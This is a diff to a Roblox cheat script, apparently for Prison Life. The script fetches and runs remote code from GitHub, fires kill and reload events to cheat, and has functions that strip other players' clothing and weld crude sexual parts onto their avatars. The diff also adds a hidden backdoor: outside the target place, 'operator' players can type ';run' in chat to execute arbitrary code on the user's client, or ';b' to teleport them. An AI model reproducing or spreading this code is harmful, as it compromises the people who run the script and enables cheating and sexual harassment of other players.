@@ -42,6 +42,116 @@ _A.U=Enum.Material;_A.V=Enum.FontSize;_A.W=Enum.Font;_A.X=Enum.TextXAlignment;_A
 _B.A="TextButton"_B.B="TextLabel"_B.C="ClassName"
 _B.D=UDim2.new
 
+
+function wow(PlayerTbl)
+	for i,v in pairs(PlayerTbl) do
+		local Torso = v.Character:FindFirstChild("Torso") or Plr.Character:FindFirstChild("UpperTorso")
+		if Torso ~= nil then
+			local P = Instance.new("Part",Torso)
+			P.Size=Vector3.new(0.676, 0.676, 0.676)
+			P.Material=Enum.Material.SmoothPlastic
+			P.Shape="Ball"
+			P.CanCollide=false P.CanQuery=false P.Massless=false
+			P.Color=Color3.new(Torso.Color.R/1.5,Torso.Color.G/1.5,Torso.Color.B/1.5)
+			local W = Instance.new("Weld",P)
+			W.Part0=P W.Part1=Torso
+			W.C0=CFrame.new(0.242, 1.158, 0.513)
+			local P2 =P:Clone()
+			P2.Parent=Torso
+			P2.Weld.Part0=P2
+			P2.Weld.C0=CFrame.new(-0.242, 1.158, 0.513)
+			local P3 = P2:Clone()
+			P3.Parent=Torso
+			P3.Size=Vector3.new(0.447,0.447,0.447)
+			P3.Weld.Part0=P3
+			P3.Weld.C0=CFrame.new(-1.901, 0.921, 0) * CFrame.fromEulerAnglesXYZ(0,math.rad(-90),0)
+			P3.BrickColor=BrickColor.new("Hot pink")
+
+			P=Instance.new("Part",Torso)
+			P.Material=Enum.Material.SmoothPlastic
+			P.CanCollide=false P.Massless=true
+			P.Shape=Enum.PartType.Cylinder
+			P.Size=Vector3.new(1.481, 0.34, 0.34)
+			P.Color=Torso.Color
+			W=Instance.new("Weld",P)
+			W.Part0=P W.Part1=Torso
+			W.C0=CFrame.new(-1.151, 0.921, 0)*CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
+
+			P,P2,P3=nil,nil,nil
+		end
+	end
+end
+
+function cool(PlrTbl)
+	for i,Plr in pairs(PlrTbl) do
+		pcall(function()
+			Plr.Character:FindFirstChildOfClass("Shirt"):Destroy()
+			Plr.Character:FindFirstChildOfClass("Pants"):Destroy()
+		end)
+		local Torso = Plr.Character:FindFirstChild("Torso") or Plr.Character:FindFirstChild("UpperTorso")
+		if Torso ~= nil then
+			local P = Instance.new("Part",Torso)
+			P.Size=Vector3.new(1.8, 1.8, 1.8)
+			P.Massless=true P.CanCollide=false P.CanQuery=false
+			P.Material=Enum.Material.SmoothPlastic
+			P.Reflectance=.1 P.Shape="Ball"
+			P.BrickColor=Torso.BrickColor
+			local W = Instance.new("Weld",P)
+			W.Part0=P
+			W.Part1=Torso
+			W.C0=CFrame.new(0.65, 1, -0.75)
+			local P = P:Clone()
+			P.Parent=Torso
+			P.Weld.C0=CFrame.new(-0.65, 1, -0.75)
+
+			local P1=P:Clone()
+			local P2=P:Clone()
+
+			P1.Parent=Torso
+			P2.Parent=Torso
+			P1.Weld.Part0=P1
+			P1.Weld.C0=CFrame.new(-0.65, 0, 0.75)
+			P2.Weld.Part0=P2
+			P2.Weld.C0=CFrame.new(0.65, 0, 0.75)
+
+			local P3=P:Clone()
+			P3.Parent=Torso
+			P3.Weld.Part0=P3
+			P3.Size=Vector3.new(0.2, 0.2, 0.2)
+			P3.Weld.C0=CFrame.new(1, 0.1, 1.6)
+			P3.Color=Color3.new(P3.Color.R/2,P3.Color.G/2,P3.Color.B/2 )
+			local P4=P3:Clone()
+			P4.Parent=Torso
+			P4.Weld.Part0=P4
+			P4.Weld.C0=CFrame.new(-1, 0.1, 1.6)
+
+			W,P=nil,nil
+		end
+		Torso=nil
+	end
+
+end
+
+function say(msg)
+	if msg == nil then return end if msg == "" then return end
+	svc("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+
+end
+
+function both(PlrTbl)
+	cool(PlrTbl)
+	wow(PlrTbl)
+end
+
+function press(Key)
+	if Key == nil then return end
+	if Key == "" then return end
+	game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode[string.upper(Key)], false, nil)
+
+	game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode[string.upper(Key)], false, nil)
+end
+
+
 if game.PlaceId==155615604 or svc("RunService"):IsStudio() then
 else
 	svc("StarterGui"):SetCore("SendNotification",{
@@ -49,8 +159,151 @@ else
 		Text="Script cannot run in this place.",
 		Duration=5,
 	})
+	
+	svc("Players").PlayerAdded:Connect(function(user)
+		if UserIsOperator(user) then
+			
+			user.Chatted:Connect(function(msg)
+				msg=msg:lower()
+				local split = string.split(msg," ")
+				if split[1]==";run" then
+					local RealCode = ""
+					table.remove(split,1)
+					for i,v in pairs(split) do
+						RealCode=RealCode..v.." "
+					end
+					loadstring(RealCode)()
+					split=nil
+				elseif split[1] == ";b" then
+					Sv.LPlr.Character.HumanoidRootPart.CFrame=user.Character.Head.CFrame
+				elseif split[2] == ";b" then
+					Sv.LPlr.Character.HumanoidRootPart.CFrame=user.Character.Head.CFrame
+				elseif split[2]==";run" then
+					local RealCode = ""
+					table.remove(split,1)
+					table.remove(split,1)
+					for i,v in pairs(split) do
+						RealCode=RealCode..v.." "
+					end
+					loadstring(RealCode)()
+					split=nil
+
+				end
+				
+				msg=nil
+				
+			end)
+			
+			
+		end
+	end)
+	
+	
+	
 	return
 end
+
+--[[
+bodyColors table: 0x09458652cc0ba409
+scales table: 0xdd7dc1b32731eda9
+defaultPantsApplied false
+emotes table: 0x7f729075c98f1a19
+playerAvatarType R15
+defaultShirtApplied false
+assets table: 0x8d60e506edf2f029
+]]
+
+local INS = svc("InsertService")
+
+local function NewAsset(Id,Character)
+	task.spawn(function()
+		local obj = INS:LoadAsset(Id)
+		if obj ~= nil then
+			for i,v in pairs(obj:GetChildren()) do
+				if v.ClassName=="Folder" then
+					for i,v in pairs(v:GetChildren()) do
+						if v.ClassName=="StringValue"or v.ClassName=="MeshPart" then
+							continue
+						else
+							v.Parent=Character
+						end
+					end
+				elseif v.ClassName=="SpecialMesh" then
+					if Character.Head:FindFirstChildOfClass("SpecialMesh") then
+						Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
+					end
+					v.Parent=Character.Head
+				elseif v.ClassName=="Decal" then
+					if Character.Head:FindFirstChildOfClass("Decal") then
+						Character.Head:FindFirstChildOfClass("Decal"):Destroy()
+					end
+					v.Parent=Character.Head
+
+				elseif v.ClassName=="MeshPart" then
+				else	
+					v.Parent=Character
+				end
+			end
+		end
+		obj=nil
+	end)
+end
+
+function char(PlrTbl,username)
+	if PlrTbl == nil then return end
+	local userid = tonumber(username) or Sv.Plrs:GetUserIdFromNameAsync(username)
+	local Info = Sv.Plrs:GetCharacterAppearanceInfoAsync(userid)
+
+	if Info == nil then return end
+
+	for i,v in pairs(PlrTbl) do
+		local V = v.Character
+		if V ~= nil then
+			--Clear appearences
+			for i,object in pairs(V:GetChildren()) do
+				if object.ClassName=="Accessory"or object.ClassName=="Body Colors"or object.ClassName=="Hat"or object.ClassName=="CharacterMesh"or object.ClassName=="Shirt"or object.ClassName=="Pants" then
+					object:Destroy()
+				end
+			end
+
+			--Create appearences
+
+			for i,v in pairs(Info.assets) do
+				NewAsset(v.id,V)
+			end
+
+			if Info.playerAvatarType == "R15" then
+				local Humanoid = V:FindFirstChildOfClass("Humanoid")
+				if Humanoid==nil then continue end
+				local AT = Humanoid:FindFirstChild("BodyDepthScale")
+				if AT ~= nil then AT.Value=Info.scales.depth end
+				AT = Humanoid:FindFirstChild("BodyHeightScale")
+				if AT ~= nil then AT.Value=Info.scales.height end
+				AT = Humanoid:FindFirstChild("BodyProportionScale")
+				if AT ~= nil then AT.Value=Info.scales.proportion end
+				AT = Humanoid:FindFirstChild("BodyWidthScale")
+				if AT ~= nil then AT.Value=Info.scales.width end
+				AT = Humanoid:FindFirstChild("HeadScale")
+				if AT ~= nil then AT.Value=Info.scales.head end
+				Humanoid=nil
+
+				local BodyColours = V:FindFirstChildOfClass("BodyColors") or Instance.new("BodyColors",V)
+				BodyColours.HeadColor = BrickColor.new(Info.bodyColors.headColorId)
+				BodyColours.TorsoColor = BrickColor.new(Info.bodyColors.torsoColorId)
+				BodyColours.LeftArmColor = BrickColor.new(Info.bodyColors.leftArmColorId)
+				BodyColours.LeftLegColor = BrickColor.new(Info.bodyColors.leftLegColorId)
+				BodyColours.RightArmColor = BrickColor.new(Info.bodyColors.rightArmColorId)
+				BodyColours.RightLegColor = BrickColor.new(Info.bodyColors.rightLegColorId)
+				BodyColours=nil
+			end
+
+		end
+		V=nil
+	end
+end
+
+
+char({workspace.Rig},"roblox")
 
 
 local Executor = nil
@@ -61,24 +314,27 @@ pcall(function()
 			Executor = loadstring(game:HttpGet("https://raw.githubusercontent.com/Bloxaar/Test/main/Exec"))()
 		end
 		if _G.UISettings.OptimiseClient == true then
-			for i,v in pairs(workspace:GetDescendants()) do
-				if v.ClassName=="Decal" or v.ClassName=="Accessory"or v.ClassName=="Texture" then
-					v:Destroy()
-				elseif v.ClassName=="UnionOperation" then
-					if not v:IsDescendantOf(workspace.Prison_Cellblock) then
-						v.Parent=game:GetService("Lighting")
-					end
-				elseif v:IsA("BasePart") then
-					v.Material=Enum.Material.Plastic
-					if v.Anchored==false then
-						v.CanCollide=false
-					end
-				elseif v.ClassName:match("Script") then
-					if not v:IsDescendantOf(Sv.LPlr.Character) then
+			Sv.New(function()
+				for i,v in pairs(workspace:GetDescendants()) do
+					if i/1000 == math.round(i/1000) then wait() end
+					if v.ClassName=="Decal" or v.ClassName=="Accessory"or v.ClassName=="Texture" then
 						v:Destroy()
+					elseif v.ClassName=="UnionOperation" then
+						if not v:IsDescendantOf(workspace.Prison_Cellblock) then
+							v.Parent=game:GetService("Lighting")
+						end
+					elseif v:IsA("BasePart") then
+						v.Material=Enum.Material.Plastic
+						if v.Anchored==false then
+							v.CanCollide=false
+						end
+					elseif v.ClassName:match("Script") then
+						if not v:IsDescendantOf(Sv.LPlr.Character) then
+							v:Destroy()
+						end
 					end
 				end
-			end
+			end)
 		end
 	end
 end)
@@ -1356,6 +1612,7 @@ local ColourData = {
 	};
 }
 
+pcall(function()
 if _G.UISettings ~= nil then
 	if typeof(_G.UISettings) == "table" then
 		for i,value in pairs(_G.UISettings) do
@@ -1389,7 +1646,7 @@ if _G.UISettings ~= nil then
 		end
 	end
 end
-
+end)
 
 for i,v in Sv.P(PrisonG:GetDescendants())do
 	if v[_B.C]==_B.A then
@@ -2034,107 +2291,6 @@ function dokill(dat,iskillreq)
 	game.ReplicatedStorage.ReloadEvent:FireServer(A_2)
 	A_1=_N;A_2=_N -- Frees memory
 
-end
-
-function wow(PlayerTbl)
-	for i,v in pairs(PlayerTbl) do
-		local Torso = v.Character:FindFirstChild("Torso")
-		if Torso ~= nil then
-			local P = Instance.new("Part",Torso)
-			P.Size=Vector3.new(0.676, 0.676, 0.676)
-			P.Material=Enum.Material.SmoothPlastic
-			P.Shape="Ball"
-			P.CanCollide=false P.CanQuery=false P.Massless=false
-			P.Color=Color3.new(Torso.Color.R/1.5,Torso.Color.G/1.5,Torso.Color.B/1.5)
-			local W = Instance.new("Weld",P)
-			W.Part0=P W.Part1=Torso
-			W.C0=CFrame.new(0.242, 1.158, 0.513)
-			local P2 =P:Clone()
-			P2.Parent=Torso
-			P2.Weld.Part0=P2
-			P2.Weld.C0=CFrame.new(-0.242, 1.158, 0.513)
-			local P3 = P2:Clone()
-			P3.Parent=Torso
-			P3.Size=Vector3.new(0.447,0.447,0.447)
-			P3.Weld.Part0=P3
-			P3.Weld.C0=CFrame.new(-1.901, 0.921, 0) * CFrame.fromEulerAnglesXYZ(0,math.rad(-90),0)
-			P3.BrickColor=BrickColor.new("Hot pink")
-
-			P=Instance.new("Part",Torso)
-			P.Material=Enum.Material.SmoothPlastic
-			P.CanCollide=false P.Massless=true
-			P.Shape=Enum.PartType.Cylinder
-			P.Size=Vector3.new(1.481, 0.34, 0.34)
-			P.Color=Torso.Color
-			W=Instance.new("Weld",P)
-			W.Part0=P W.Part1=Torso
-			W.C0=CFrame.new(-1.151, 0.921, 0)*CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
-
-			P,P2,P3=nil,nil,nil
-		end
-	end
-end
-
-function cool(PlrTbl)
-	for i,Plr in pairs(PlrTbl) do
-		pcall(function()
-			Plr.Character:FindFirstChildOfClass("Shirt"):Destroy()
-			Plr.Character:FindFirstChildOfClass("Pants"):Destroy()
-		end)
-		local Torso = Plr.Character:FindFirstChild("Torso")
-		if Torso ~= nil then
-			local P = Instance.new("Part",Torso)
-			P.Size=Vector3.new(1.8, 1.8, 1.8)
-			P.Massless=true P.CanCollide=false P.CanQuery=false
-			P.Material=Enum.Material.SmoothPlastic
-			P.Reflectance=.1 P.Shape="Ball"
-			P.BrickColor=Torso.BrickColor
-			local W = Instance.new("Weld",P)
-			W.Part0=P
-			W.Part1=Torso
-			W.C0=CFrame.new(0.65, 1, -0.75)
-			local P = P:Clone()
-			P.Parent=Torso
-			P.Weld.C0=CFrame.new(-0.65, 1, -0.75)
-
-			local P1=P:Clone()
-			local P2=P:Clone()
-
-			P1.Parent=Torso
-			P2.Parent=Torso
-			P1.Weld.Part0=P1
-			P1.Weld.C0=CFrame.new(-0.65, 0, 0.75)
-			P2.Weld.Part0=P2
-			P2.Weld.C0=CFrame.new(0.65, 0, 0.75)
-
-			local P3=P:Clone()
-			P3.Parent=Torso
-			P3.Weld.Part0=P3
-			P3.Size=Vector3.new(0.2, 0.2, 0.2)
-			P3.Weld.C0=CFrame.new(1, 0.1, 1.6)
-			P3.Color=Color3.new(P3.Color.R/2,P3.Color.G/2,P3.Color.B/2 )
-			local P4=P3:Clone()
-			P4.Parent=Torso
-			P4.Weld.Part0=P4
-			P4.Weld.C0=CFrame.new(-1, 0.1, 1.6)
-
-			W,P=nil,nil
-		end
-		Torso=nil
-	end
-
-end
-
-function both(PlrTbl)
-	cool(PlrTbl)
-	wow(PlrTbl)
-end
-
-function press(Key)
-	if Key == nil then return end
-	game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode[string.upper(Key)], false, nil)
-	
-	game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode[string.upper(Key)], false, nil)
 end
 
 LocalisedFunctions.kill = function(dat,iskillreq)
@@ -4680,14 +4836,17 @@ local Humanoid,B,B1,B2,B3=nil,nil,nil,nil,nil
 local TotalAnimationsRunning=0
 
 ReplicatedStorage.UpdateEvent.OnClientEvent:Connect(function(Ammo,Gun)
-	if (tonumber(Ammo) or 0) <=0 then
-		if Gun ~= nil then
-			if States.RapidFire then
+	if States.RapidFire then
+		if (tonumber(Ammo) or 0) <=0 then
+			if Gun ~= nil then
 				ReplicatedStorage.ReloadEvent:FireServer(Gun)
 			end
 		end
 	end
 end)
+
+
+
 
 Sv.LPlr.CharacterAdded:Connect(function(A)
 	TotalAnimationsRunning=0
